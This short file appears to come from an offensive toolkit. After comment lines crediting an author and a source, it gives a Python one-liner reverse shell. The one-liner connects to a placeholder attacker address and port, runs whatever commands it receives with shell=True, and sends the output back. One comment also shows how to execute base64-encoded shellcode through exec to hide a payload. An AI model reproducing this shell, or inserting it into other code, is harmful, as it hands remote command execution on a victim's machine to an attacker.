# simple python shell | Author: r00t-3xp10it
# credits: http://securityweekly.com/2011/10/23/python-one-line-shell-code/
# decode base64 string example: python -c "exec('encoded-shellcode'.decode('base64'))"
# ---
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('IpAdDr',P0rT))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

